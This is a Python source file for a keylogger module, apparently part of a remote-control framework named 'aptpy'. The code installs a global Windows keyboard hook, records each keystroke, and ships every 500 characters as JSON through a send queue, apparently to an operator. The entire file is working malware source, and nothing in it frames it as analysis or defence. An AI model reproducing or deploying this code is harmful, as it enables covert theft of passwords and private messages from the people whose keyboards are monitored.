import pyHook
import pythoncom
from abstract import AbstractModule
from json import dumps
from logging import getLogger


class KeyloggerModule(AbstractModule):
    def __init__(self, queue_send, event):
        super(KeyloggerModule, self).__init__(queue_send, event)

        self._keys = ''
        self._hooks_manager = pyHook.HookManager()
        self._hooks_manager.KeyDown = self._keydown

    def _execute(self):
        getLogger('aptpy').debug("[KEYLOGGER] Inside _execute function")

        if self.cmd.get('cmd') == 'start':
            getLogger('aptpy').debug("[KEYLOGGER] Starting keylogger loop")
            self._hooks_manager.HookKeyboard()
            pythoncom.PumpMessages()

    # TODO This is a very simply implementation, we have to gather more info about the window AND take care of
    # key combinations (ie copy & paste and uppercase)
    def _keydown(self, event):
        ignore = [0, 27]

        if event.Ascii in ignore:
            return True

        if event.Ascii == 8:
            key = '<BACK>'
        elif event.Ascii == 9:
            key = '<TAB>'
        elif event.Ascii == 13:
            key = '\n'
        else:
            key = unichr(event.Ascii)

        self._keys += key

        getLogger('aptpy').debug("[KEYLOGGER] Got key: " + key)

        if len(self._keys) >= 500:
            message = {
                'module': "KeyloggerModule",
                "result": self._keys
            }

            getLogger('aptpy').debug("[KEYLOGGER] Got keys: " + self._keys)

            self.queue_send.put(dumps(message))
            self._keys = ''

        return True
